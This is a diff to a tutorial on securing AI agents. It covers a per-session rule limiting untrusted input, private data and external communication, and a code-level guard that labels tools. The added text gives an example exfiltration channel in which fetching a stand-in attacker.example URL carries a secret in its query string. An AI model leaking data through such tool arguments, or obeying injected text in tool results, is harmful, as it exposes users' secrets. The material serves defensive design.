@@ -180,7 +180,7 @@ no more than two of three properties within a session: processing untrusted
 input, accessing sensitive systems or private data, and changing state or
 communicating externally. The phrase that matters here is *within a session*.
 An agent may be allowed all three kinds of tool, as long as no single session
-uses all three. Security tooling for agents enforces exactly this: Oso's
+uses all three. Some security tooling for agents enforces this: Oso's
 agent documentation, for example, describes its decisions as
 [stateful](https://www.osohq.com/docs/oso-for-agents/use-cases), depending on
 what happened earlier in the same session, such as whether the agent recently
@@ -205,7 +205,15 @@ The guard that holds is decided entirely in code:
 
 - **Each tool declares, in code, what its results are.** `read_email` brings
   in text a stranger wrote; `get_agent` returns private data; `send_email`
-  sends something out. The developer writes this down once, as data.
+  sends something out. The developer writes this down once, as data. A
+  tool can carry more than one label, and "sends something out" means
+  *anything* that leaves the system, including the arguments of a tool
+  that looks read-only. A `fetch_url` tool brings in a stranger's page, and its
+  URL also goes to whoever runs that server, so it's both `untrusted` and
+  `external`. That's the channel
+  [Module 3 showed](/03-tool-design-for-agents/10-the-tool-threat-model/03-the-dangerous-combination/):
+  a fetch of `attacker.example/?d=<secret>` sends the secret out in the
+  request itself.
 - **The session guard records labels, never reads content.** When a tool
   returns, the guard adds that tool's labels to the session. What the result
   says about itself, "this message is trusted", has no effect, and neither
